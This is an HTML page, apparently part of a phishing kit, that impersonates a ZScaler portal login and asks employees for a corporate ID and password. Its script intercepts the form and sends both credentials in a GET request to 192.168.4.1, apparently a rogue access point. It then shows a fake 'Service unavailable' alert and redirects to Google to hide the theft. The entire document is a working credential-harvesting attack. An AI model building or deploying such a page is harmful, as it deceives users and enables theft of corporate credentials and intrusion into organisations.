<title>ZScaler Portal Login</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #FFFFFF;
        color: black;
        text-align: left;
    }
    .container {
        max-width: 400px;
        margin: auto;
        padding: 20px;
    }
    .logo {
        width: 140px;
        height: 140px;
    }
    form {
        background-color: white;
        color: black;
        padding: 20px;
        border-radius: 5px;
    }
    input[type="text"], input[type="password"] {
        width: 90%;
        padding: 15px;
        margin: 10px 0;
        border: none;
        background: #f1f1f1;
    }
    input[type="submit"] {
        background-color: #00754a;
        color: white;
        padding: 14px 20px;
        border: none;
        cursor: pointer;
        width: 100%;
    }
    @media screen and (max-width: 600px) {
        .container {
            width: 95%;
        }
    }
    .welcome {
        font-size: 24px;
        margin-bottom: 0;
    }
    .login {
        font-size: 16px;
        margin-top: 0;
    }
</style>

        <form id="loginForm" onsubmit="sendCredentials(event)">
            <label for="uname"><b>Corporate ID</b></label>
            <input type="text" placeholder="* Enter employee ID or number" id="email" name="uname" required>
            <label for="psw"><b>Password</b></label>
            <input type="password" placeholder="* Enter Password" id="password" name="psw" required>
            <input type="submit" value="Login">
        </form>
    </div>

    <script>
        function sendCredentials(event) {
            event.preventDefault();
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
			alert("Service unavailable.");
            window.location.href = "https://www.google.com";
        }

        function getFile(url) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }
    </script>
